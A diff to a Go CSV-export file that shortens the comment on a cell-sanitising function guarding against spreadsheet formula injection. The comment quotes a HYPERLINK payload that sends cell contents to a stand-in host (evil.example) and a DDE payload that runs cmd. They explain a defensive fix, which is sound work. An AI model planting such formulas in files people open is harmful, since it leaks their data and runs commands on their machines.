@@ -70,34 +70,25 @@ func (d Dataset) WriteCSV(w io.Writer, provenance bool) error {
 // The first two are always written; the rest are added by --provenance.
 var ReservedColumns = [...]string{"sources", "contested", "source_urls", "quote", "disagreements"}
 
-// cleanCell removes what a spreadsheet would misread, and defuses what it would
+// cleanCell removes what a spreadsheet would misread and defuses what it would
 // EXECUTE.
 //
-// A newline inside a quoted CSV field is legal and survives a correct reader, and
-// is misread by enough of them that a dataset opened in the wrong tool looks
-// corrupted. A tab likewise. Neither carries meaning in an extracted value.
+// Newlines and tabs inside a quoted CSV field are legal, carry no meaning in an
+// extracted value, and are misread by enough tools to make a dataset look
+// corrupted.
 //
-// The second half is a security fix rather than a cosmetic one. Excel, LibreOffice
-// and Google Sheets evaluate a cell whose first character is =, +, - or @, so a
-// page containing
+// The second half is security. Excel, LibreOffice and Sheets evaluate a cell
+// starting =, +, - or @, so a page containing
 //
 //	=HYPERLINK("http://evil.example?x="&A1,"click")
 //
-// becomes a live exfiltration link the moment somebody opens the file, and
-// =cmd|' /C calc'!A0 is the DDE variant. mole extracts from arbitrary web pages
-// into a file a user opens in a spreadsheet, which is the whole of that threat
-// model — and a probe confirmed every one of those payloads reached the output
-// untouched.
+// becomes an exfiltration link when the file is opened, and =cmd|' /C calc'!A0
+// is the DDE variant. mole extracts from arbitrary web pages into a file people
+// open in spreadsheets, which is that threat model exactly.
 //
-// The mitigation is the standard one: prefix a leading apostrophe, which every
-// spreadsheet treats as "the rest is text" and which a CSV parser reading the file
-// programmatically sees as one harmless character. Escaping the formula instead
-// would change the value; refusing the row would lose data over a rendering
-// concern.
-// The whitespace half is one call, not five: strings.Fields splits on every
-// unicode space, so the four ReplaceAll lines that preceded it were replacing
-// characters it was about to split on anyway. Kept as a note because the
-// replacements read like they were doing something.
+// A leading apostrophe is the standard mitigation: spreadsheets read the rest as
+// text, a CSV parser sees one harmless character. Escaping would change the
+// value; refusing the row would lose data over a rendering concern.
 func cleanCell(s string) string {
 	return defuseFormula(strings.Join(strings.Fields(s), " "))
 }
